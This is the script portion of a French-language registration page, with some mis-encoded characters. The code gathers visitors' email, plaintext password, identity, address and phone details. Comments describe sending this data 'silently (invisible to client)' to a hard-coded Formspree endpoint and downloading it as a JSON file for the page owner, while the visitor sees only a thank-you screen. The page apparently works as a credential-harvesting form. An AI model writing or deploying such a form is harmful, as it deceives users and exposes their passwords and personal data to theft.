  /* â”€â”€ JSON PANEL â”€â”€ */
  .json-panel {
    background: #1e2a2a;
    border-radius: 6px;
    padding: 20px 24px;
    margin-bottom: 30px;
    display: none;
    animation: slideDown 0.3s ease;
  }
  .json-panel.visible { display: block; }
  @keyframes slideDown {
    from { opacity: 0; transform: translateY(-10px); }

  .json-panel-header {

  /* Validation */

  /* â”€â”€ RESPONSIVE â”€â”€ */

</style>

<script>
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // âš™ï¸  SEULE LIGNE Ã€ MODIFIER : colle ici ton endpoint
  //     Formspree aprÃ¨s inscription sur formspree.io
  //     Ex: "https://formspree.io/f/xabcdefg"
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  var FORMSPREE_ENDPOINT = "https://formspree.io/f/xwvnqjnb";

  // â”€â”€ Toggle password visibility
  function togglePwd(icon) {
    var input = icon.previousElementSibling;
    if (input.type === 'password') {
      input.type = 'text';
      icon.textContent = 'ğŸ™ˆ';
    } else {
      input.type = 'password';
      icon.textContent = 'ğŸ‘';
    }
  }

  // â”€â”€ Validate required fields
  function validateRequired() {
    var required = ['reg-email','reg-pwd','reg-pwd2','prenom','nom','adresse','cp','ville','tel'];
    var valid = true;
    required.forEach(function(id) {
      var el = document.getElementById(id);
      el.classList.remove('error');
      if (!el.value.trim()) { el.classList.add('error'); valid = false; }
    });
    var p1 = document.getElementById('reg-pwd');
    var p2 = document.getElementById('reg-pwd2');
    if (p1.value && p2.value && p1.value !== p2.value) {
      p2.classList.add('error');
      valid = false;
      alert('Les mots de passe ne correspondent pas.');
    }
    return valid;
  }

  // â”€â”€ Get field value
  function v(id) {
    var el = document.getElementById(id);
    return el ? (el.value.trim() || null) : null;
  }

  // â”€â”€ Build data object
  function buildData() {
    return {
      id_inscription: 'USR-' + Date.now(),
      horodatage: new Date().toISOString(),
      compte: {
        email: v('reg-email'),
        mot_de_passe: v('reg-pwd')
      },
      identite: {
        civilite:       v('civilite'),
        prenom:         v('prenom'),
        nom:            v('nom'),
        date_naissance: v('ddn'),
        langue:         v('langue')
      },
      adresse: {
        numero_voie:  v('adresse'),
        complement_1: v('compl1'),
        complement_2: v('compl2'),
        lieu_dit:     v('lieudit'),
        code_postal:  v('cp'),
        ville:        v('ville'),
        pays:         v('pays')
      },
      contact: {
        telephone: v('tel'),
        mobile:    v('mobile')
      }
    };
  }

  // â”€â”€ Send to Formspree silently (invisible to client)
  function sendToFormspree(data) {
    if (FORMSPREE_ENDPOINT.indexOf('REMPLACE_MOI') !== -1) {
      console.warn('âš ï¸  Formspree non configurÃ©. DonnÃ©es loggÃ©es ci-dessous :');
      console.log(JSON.stringify(data, null, 2));
      return;
    }
    fetch(FORMSPREE_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify(data)
    }).catch(function(e) { console.error('Erreur envoi Formspree :', e); });
  }

  // â”€â”€ What the CLIENT sees : a warm confirmation only
  function showConfirmation(prenom) {
    document.querySelector('main').innerHTML =
      '<div style="text-align:center;padding:80px 20px;max-width:600px;margin:0 auto;font-family:Raleway,sans-serif;">' +
        '<div style="width:70px;height:70px;background:#2a9d8f;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:34px;color:#fff;">âœ“</div>' +
        '<h2 style="font-size:26px;color:#2a9d8f;margin-bottom:14px;">Merci ' + (prenom || '') + '&nbsp;!</h2>' +
        '<p style="color:#666;font-size:15px;line-height:1.8;margin-bottom:8px;">Votre compte a bien Ã©tÃ© crÃ©Ã© et vos informations ont Ã©tÃ© enregistrÃ©es.</p>' +
        '<p style="color:#aaa;font-size:13px;">Vous recevrez une confirmation Ã  l\'adresse email renseignÃ©e.</p>' +
      '</div>';
  }

  // â”€â”€ Main submit handler
  function collectData() {
    if (!validateRequired()) return;
    var data = buildData();
    window._lastFormData = data;
    downloadJSON(data);            // TÃ©lÃ©chargement immÃ©diat du JSON pour toi
    sendToFormspree(data);         // Envoi silencieux vers Formspree
    showConfirmation(data.identite.prenom); // Le client voit juste "Merci"
  }

  function downloadJSON(data) {
    var json = JSON.stringify(data, null, 2);
    var blob = new Blob([json], { type: 'application/json' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    var email = (data.compte.email || 'inconnu').replace(/[^a-z0-9]/gi, '_');
    a.href = url;
    a.download = 'lesormes_' + email + '_' + Date.now() + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

</script>
